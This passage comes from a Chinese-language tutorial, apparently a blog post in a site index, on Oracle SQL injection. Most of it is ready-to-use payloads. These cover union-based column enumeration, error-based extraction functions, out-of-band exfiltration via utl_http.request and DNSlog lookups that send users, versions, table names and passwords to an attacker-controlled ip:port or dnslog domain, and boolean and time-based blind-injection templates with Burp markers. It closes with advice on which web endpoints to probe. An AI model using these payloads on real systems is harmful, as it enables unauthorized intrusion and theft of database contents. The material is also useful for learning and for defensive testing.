+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 01.先判断列数,同Mysql一样</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39;+order+by+4--+ #返回正常</span><br><span class="line">?id&#x3D;1&#39;+order+by+5--+ #提示报错</span><br><span class="line"></span><br><span class="line">得出结论数据为: 5 列</span><br><span class="line"></span><br><span class="line"># 02.然后对每一列的数据类型进行判断（可以使用null代替某些无法快速猜测出数据类型的位置），先默认每一列均为null，然后从第一列开始依次将null改为字符串，如果报错则说明该列是数字型，否则则是字符型。,同Mysql一样</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&#39;+union+select+user+null+null+null+from+dual--+ #查询当前用户名</span><br><span class="line">以此类推</span><br><span class="line"></span><br><span class="line"># 03. 利用select table_name from user_tables where rownum&#x3D;1获取表名（列名table数据同理）：</span><br><span class="line"></span><br><span class="line">select column_name from user_tab_columns where table_name&#x3D;&#39;TB_USER&#39; and rownum&#x3D;1（获取列名）</span><br><span class="line">select USER_ID from TB_USER where USER_ID&#x3D;1 and rownum&#x3D;1（获取数据）</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、-报错注入"><a href="#2、-报错注入" class="headerlink" title="2、 报错注入"></a>2、 报错注入</h4><p><strong>构造报错语句，通过数据库报错来带出我们要查询的数据</strong>，常用的报错函数包括（upper函数大写转小写）</p>
+<ul>
+<li>XMLType()</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中间为查询语句</span><br><span class="line"></span><br><span class="line">upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62)))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>dbms_xdb_version.checkin()</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中间为查询语句</span><br><span class="line"></span><br><span class="line">upper(dbms_xdb_version.checkin((select user from dual)))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>ctxsys.drithsx.sn()</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中间为查询内容</span><br><span class="line"></span><br><span class="line">upper(dbms_xdb_version.checkin((select user from dual)))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>ordsys.ord_dicom.getmappingxpath()</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中间为查询内容</span><br><span class="line"></span><br><span class="line">ordsys.ord_dicom.getmappingxpath(user,user,user)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>dbms_utility.sqlid_to_sqlhash()</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中间为查询内容</span><br><span class="line"></span><br><span class="line">dbms_utility.sqlid_to_sqlhash((select user from dual))</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong><em>无回显的情况：</em></strong></p>
+<h4 id="1、-oob外带数据（nc监听）"><a href="#1、-oob外带数据（nc监听）" class="headerlink" title="1、 oob外带数据（nc监听）"></a>1、 oob外带数据（nc监听）</h4><p>通过HTTP请求,或者DNSlog,来构造语句,如果目标出网,并且对数据库函数没有进行限制,就会实现攻击</p>
+<ul>
+<li>HTTP 请求外带数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and utl_http.request(&#39;http:&#x2F;&#x2F;ip:port&#x2F;&#39;||(select banner from sys.v_$version where rownum&#x3D;1))&#x3D;1--  查询指纹版</span><br><span class="line"></span><br><span class="line">and utl_http.request(&#39;http:&#x2F;&#x2F;ip:port&#x2F;&#39;%7C%7C(select SYS_CONTEXT (&#39;USERENV&#39;, &#39;CURRENT_USER&#39;)from dual))&#x3D;1 -- 查询环境</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">and%20 utl_http.request(&#39;http:&#x2F;&#x2F;ip:port&#x2F;&#39;%7c%7c (select user from dual))&#x3D;1-- 查询当前用户</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">and%20%20utl_http.request(%27http:&#x2F;&#x2F;ip:port&#x2F;%27%7c%7c(select%20instance_name%20from%20v$instance))&#x3D;1--查询具体内容</span><br><span class="line"></span><br><span class="line">and utl_http.request(&#39;http:&#x2F;&#x2F;ip:port&#x2F;&#39;||(select TABLE_NAME from all_tables where rownum&#x3D;1))&#x3D;1-- 查询所有数据表名</span><br><span class="line"></span><br><span class="line">select name from v$database;</span><br><span class="line"></span><br><span class="line">select instance_name from v$instance;</span><br><span class="line"></span><br><span class="line">1.查询所有数据库</span><br><span class="line"></span><br><span class="line">由于Oralce没有库名,只有表空间,所以Oracle没有提供数据库名称查询支持，只提供了表空间名称查询。</span><br><span class="line">select * from v$tablespace;--查询表空间(需要一定权限)</span><br><span class="line"></span><br><span class="line">2.查询当前数据库中所有表名</span><br><span class="line"></span><br><span class="line">select * from user_tables;</span><br><span class="line"></span><br><span class="line">3.查询指定表中的所有字段名</span><br><span class="line"></span><br><span class="line">select column_name from user_tab_columns where table_name &#x3D; &#39;table_name&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4.查询指定表中的所有字段名和字段类型</span><br><span class="line"></span><br><span class="line">select column_name, data_type from user_tab_columns where table_name &#x3D; &#39;table_name&#39;;   &#x2F;&#x2F;具体的话加 and rownum &#x3D;  1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>DSNlog请求外带数据</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- UTL_HTTP.REQUEST</span><br><span class="line"></span><br><span class="line">select name from test_user where id &#x3D;1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id&#x3D;1)||&#39;.dnslog&#39;) FROM sys.DUAL;</span><br><span class="line"></span><br><span class="line">- DBMS_LDAP.INIT</span><br><span class="line"></span><br><span class="line">select name from test_user where id &#x3D;1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id&#x3D;1)||&#39;.dnslog&#39;,80) FROM sys.DUAL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- HTTPURITYPE </span><br><span class="line"></span><br><span class="line">select name from test_user where id &#x3D;1 union SELECT HTTPURITYPE((select pass from test_user where id&#x3D;1)||&#39;.dnslog&#39;).GETCLOB() FROM sys.DUAL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- UTL_INADDR.GET_HOST_ADDRESS </span><br><span class="line"></span><br><span class="line">select name from test_user where id &#x3D;1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id&#x3D;1)||&#39;.dnslog&#39;) FROM sys.DUAL;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、-基于布尔值的盲注"><a href="#2、-基于布尔值的盲注" class="headerlink" title="2、 基于布尔值的盲注"></a>2、 基于布尔值的盲注</h4><p>通过<strong>构造不同条件（正确or错误）</strong>,<strong>返回相应页面的不同</strong>,就形成了Bool值的注入</p>
+<ul>
+<li>通过 substr() decode() 函数的盲注(常用)</li>
+</ul>
+<p>先介绍一下decode的用法简化了if</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">decode(条件,值1,返回值1,值2,返回值2,...值n,返回值n,缺省值)    值1 就返回1</span><br><span class="line">decode(字段或字段的运算，值1，值2，值3）  条件为值几就返回几</span><br><span class="line"></span><br><span class="line">栗子：</span><br><span class="line">select decode(性别，男，1，0），decode(性别，女，1，0） from students 返回男女生的数量。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 按位截取数据,Bp俩个标记:第一个为截取位数,第二个为:所有字符:</span><br><span class="line"></span><br><span class="line">and+1&#x3D;(select+decode(substr((select user from dual),§1§,1),&#39;§S§&#39;,(1),0) from dual)--+ #查 user</span><br><span class="line"></span><br><span class="line">and+1&#x3D;(select decode(substr((select banner from sys.v_$version wher rownum&#x3D;1),1 ,1),&#39;S&#39;,(1),0) from dual)--+ # 查version </span><br><span class="line"></span><br><span class="line">and+1&#x3D;(select decode(substr((select table_name from user_tables where rownum&#x3D;1),§1§,1),&#39;§S§&#39;,(1),0) from dual)--+ # 查表名</span><br><span class="line"></span><br><span class="line">总结就是decode判断处用substr阶段出select返回的字符爆破。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过 case、substr()、ascii() 函数的盲注</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126):</span><br><span class="line">  123&#x3D;(case when ascii(substr(user,§0§,1))&#x3D;§121§ then &#39;123&#39; else &#39;456&#39; end)--+</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过 case、instr()、chr() 函数的盲注</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 按位截取数据,Bp俩个标记:第一个为:所有可见字符的ASCII码(32~126): 第二个,第三个为:值相同为截取位数</span><br><span class="line">123&#x3D;(case instr(user,chr(§*§),§*§,1) when §*§ then &#39;123&#39; else &#39;456&#39; end)--+</span><br></pre></td></tr></table></figure>
+
+<p>后面这两个完全可以不用ascii、instr函数直接判断字符，这样做的目的也就是方便写脚本。还有其他方式来利用,配合函数,不同环境不同用法，但是用脚本爆破盲注其实远不如用外带数据通道来做。</p>
+<h4 id="3、-基于时间的盲注"><a href="#3、-基于时间的盲注" class="headerlink" title="3、 基于时间的盲注"></a>3、 基于时间的盲注</h4><p>时间盲注，<strong>基于服务器返回所用的时间，判断函数是否执行，从而判断是否存在注入</strong></p>
+<ul>
+<li>Decode()、DBMS_PIPE.receive_message()、chr()、substr()利用</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 按位截取数据,Bp俩个标记:第一个为:截取位数 第二个为:所有可见字符的ASCII码(32~126):</span><br><span class="line">&#39;||decode(substr(user,§*§,1),chr(§*§),DBMS_PIPE.receive_message(&#39;sen&#39;,1),2)||&#39; #查user</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.cnblogs.com/-qing-/p/10951998.html" target="_blank" rel="noopener">https://www.cnblogs.com/-qing-/p/10951998.html</a> 详细的时间盲注，从权限和耗时角度考虑，耗时上也可以运用到笛卡尔积。</p>
+<h2 id="0x03-后话思路"><a href="#0x03-后话思路" class="headerlink" title="0x03 后话思路"></a>0x03 后话思路</h2><p>1、 实际测试过程中，与网站交互或存在注入的概率不是很大。着重测试一些微应用的后端或者后端的api。所以在搜索处，表单的提交处，各种与后台交互的细小的点都可以测试。</p>
+<p>2、 只要自己成功判断后端执行了我们拼接的sql语句。就是存在问题，配合数据库特性1/0也是可以的。</p>
 ]]></content>
   </entry>
 </search>
